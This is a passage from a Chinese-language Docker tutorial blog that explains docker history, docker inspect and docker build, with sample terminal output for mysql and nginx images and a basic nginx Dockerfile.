class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br></code></pre></td></tr></table></figure><h5 id="–no-trunc-1"><a href="#–no-trunc-1" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整信息</p><h4 id="images"><a href="#images" class="headerlink" title="images"></a>images</h4><p>image ID 或REPOSITORY:TAG</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker images<br>REPOSITORY                TAG          IMAGE ID       CREATED         SIZE<br>grafana/grafana           10.2.4       147eb932c0fd  <span class="hljs-number"> 10 </span>days ago     391MB<br>mysql                     8.3.0        e68e2614955c  <span class="hljs-number"> 5 </span>weeks ago     638MB<br>apache/activemq-artemis   latest       76998b3399b7  <span class="hljs-number"> 3 </span>months ago    312MB<br>lamp_web                  latest       41d9dabcb737  <span class="hljs-number"> 6 </span>months ago    524MB<br>mysql                     latest       de7c37d1d5ac  <span class="hljs-number"> 6 </span>months ago    599MB<br>ubuntu                    latest       4c2c87c6c36e  <span class="hljs-number"> 14 </span>months ago   69.2MB<br>kalilinux/kali-rolling    latest       0d323592c7f5  <span class="hljs-number"> 14 </span>months ago   140MB<br>centos                   <span class="hljs-number"> 7 </span>           c9a1fdca3387  <span class="hljs-number"> 2 </span>years ago     301MB<br>nginx                     latest       eeb9db34b331  <span class="hljs-number"> 2 </span>years ago     134MB<br>php                       7.4.21-fpm   1829ff0bdd88  <span class="hljs-number"> 2 </span>years ago     364MB<br>vulhub/flink              1.11.2       b137254280cc  <span class="hljs-number"> 3 </span>years ago     625MB<br>islandora/activemq        latest       5d0bce1752d7  <span class="hljs-number"> 3 </span>years ago     272MB<br>webcenter/activemq        latest       3af156432993  <span class="hljs-number"> 7 </span>years ago     422MB<br></code></pre></td></tr></table></figure><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql<br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB     <br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">➜  /tmp docker history mysql:<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span><br>IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT<br>e68e2614955c   <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;mysqld&quot;</span>]                                  0B        buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">EXPOSE</span> map[<span class="hljs-number">3306</span>/tcp:&#123;&#125; <span class="hljs-number">33060</span>/tcp:&#123;&#125;]            <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;docker-entrypoint.sh&quot;</span>]             0B        buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">COPY</span><span class="language-bash"> docker-entrypoint.sh /usr/local/bin/ <span class="hljs-comment"># …   13.5kB    buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">VOLUME</span><span class="language-bash"> [/var/lib/mysql]                         0B        buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/sh -c <span class="hljs-built_in">set</span> -eux;  microdnf install -…   303MB     buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> MYSQL_SHELL_VERSION=<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1</span>.el8             <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/sh -c <span class="hljs-built_in">set</span> -eu;  &#123;   <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[mysql-to…   226B      buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  microdnf install -…   197MB     buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eu;  &#123;   echo &#x27;</span>[mysqlinn…   246B      buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> MYSQL_VERSION=<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1</span>.el8                   <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> MYSQL_MAJOR=innovation                      <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/sh -c <span class="hljs-built_in">set</span> -eux;  key=<span class="hljs-string">&#x27;BCA4 3417 C3B…   3.17kB    buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  microdnf install -…   14MB      buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;…   2.4MB     buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> GOSU_VERSION=<span class="hljs-number">1.16</span>                           <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  groupadd --system …   2.77kB    buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   /bin/sh -c <span class="hljs-comment">#(nop)  CMD [&quot;/bin/bash&quot;]            0B        </span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   /bin/sh -c <span class="hljs-comment">#(nop) ADD file:53c58659a3a149d31…   122MB   </span><br></code></pre></td></tr></table></figure><h2 id="查看镜像元数据"><a href="#查看镜像元数据" class="headerlink" title="查看镜像元数据"></a>查看镜像元数据</h2><h3 id="docker-inspect"><a href="#docker-inspect" class="headerlink" title="docker inspect"></a>docker inspect</h3><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的基础数据</p><h4 id="OPTIONS-3"><a href="#OPTIONS-3" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  /tmp docker images <span class="hljs-string">| grep nginx</span><br>nginx                     latest       eeb9db34b331   <span class="hljs-number">2</span> years ago     <span class="hljs-number">134</span>MB<br></code></pre></td></tr></table></figure><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs wren">➜  /<span class="hljs-variable">tmp</span> <span class="hljs-variable">docker</span> inspect <span class="hljs-variable">nginx</span><br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;sha256:eeb9db34b33190cac170b27d857e9b23511d396a2609c1a54e93025634afed0a&quot;</span>,<br>        <span class="hljs-string">&quot;RepoTags&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx:latest&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;RepoDigests&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;Parent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Comment&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2021-12-29T18:45:32.26799474Z&quot;</span>,<br>        <span class="hljs-string">&quot;Container&quot;</span>: <span class="hljs-string">&quot;28117e6cd07462919e64874c17cec15a453e5b3d99b088f04a12a7640c27c280&quot;</span>,<br>        <span class="hljs-string">&quot;ContainerConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;28117e6cd074&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>                <span class="hljs-string">&quot;-c&quot;</span>,<br>                <span class="hljs-string">&quot;#(nop) &quot;</span>,<br>                <span class="hljs-string">&quot;CMD [<span class="hljs-char escape_">\&quot;</span>nginx<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>-g<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>daemon off;<span class="hljs-char escape_">\&quot;</span>]&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;DockerVersion&quot;</span>: <span class="hljs-string">&quot;20.10.7&quot;</span>,<br>        <span class="hljs-string">&quot;Author&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;nginx&quot;</span>,<br>                <span class="hljs-string">&quot;-g&quot;</span>,<br>                <span class="hljs-string">&quot;daemon off;&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Architecture&quot;</span>: <span class="hljs-string">&quot;arm64&quot;</span>,<br>        <span class="hljs-string">&quot;Variant&quot;</span>: <span class="hljs-string">&quot;v8&quot;</span>,<br>        <span class="hljs-string">&quot;Os&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;Size&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;VirtualSize&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/19bce005f2b1d9db0eba7c613875f51cd1b7a19ea0a43dcbf45c1017fbcc03dc/diff:/var/lib/docker/overlay2/2949cec29c3a2dfba7a1cbc215919f6ec18a27e80506dbbc51017f4389bb604e/diff:/var/lib/docker/overlay2/8f23aefbf0d9446e0dd6f9d228bdd2ed21b4b556d064352cdb546407fbe22b7b/diff:/var/lib/docker/overlay2/aba312ecee136814284e1d21b2d4f6c28cdabb85ee4d3142324ae752156359ac/diff:/var/lib/docker/overlay2/3db4264e94b91b2dac969fd2a0af7317aeb303e8d0032162e2e4734c05b750c9/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;RootFS&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;layers&quot;</span>,<br>            <span class="hljs-string">&quot;Layers&quot;</span>: [<br>                <span class="hljs-string">&quot;sha256:1c79be3b9cebb9838b5c607567cb18eb50cd94e39b20a6241ca7d2d53dcffc89&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:c6652321c7b9deb69994b5490710e7ab52a38f5171eddbe6f4d47fb9ea928929&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:d00df4ca0725daf0ad547fcc9c731ed877d7b898559703ffe94e35de77ebd455&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:eb5d612bd5e0648b5dd9680101b778787652f435ac73db4b5e559b868392a314&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:01792ec538b3b8d67d341ad7b079beec9b289feb8a1e618b3fcfe2bb0c206a2b&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:7bc89178e1bbe5212cc907f798b0f3bb3e07c71083390703e04486012d398a4f&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;Metadata&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;LastTagTime&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h2 id="生成镜像"><a href="#生成镜像" class="headerlink" title="生成镜像"></a>生成镜像</h2><h3 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h3><p><strong>docker build [OPTIONS] PATH | URL | -</strong></p><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>已有的镜像不能满足业务需求，需要自己构建符合需求的镜像</p><h4 id="OPTIONS-4"><a href="#OPTIONS-4" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h5><p>–tag list</p><p>–target string  指定镜像 tag</p><h4 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h4><p>指定 Dockerfile 路径</p><h4 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4><h5 id="编写-Dockerfile-文件"><a href="#编写-Dockerfile-文件" class="headerlink" title="编写 Dockerfile 文件"></a>编写 Dockerfile 文件</h5><p>注意：文件名就是Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">➜  test cat Dockerfile <br><span class="hljs-comment"># 使用官方的 Ubuntu 20.04 镜像作为基础</span><br><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-comment"># 作者信息</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;your-email@example.com&quot;</span></span><br><br><span class="hljs-comment"># 更新 apt 软件包列表并安装一个示例应用程序</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y \</span><br><span class="language-bash">    nginx \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*</span><br><br><span class="hljs-comment"># 将本地文件复制到镜像中</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> index.html /var/www/html/</span><br><br><span class="hljs-comment"># 暴露端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 定义容器启动时运行的命令</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><h5 id="build镜像"><a href="#build镜像" class="headerlink" title="build镜像"></a>build镜像</h5><p>docker build -t my-nginx-image .</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 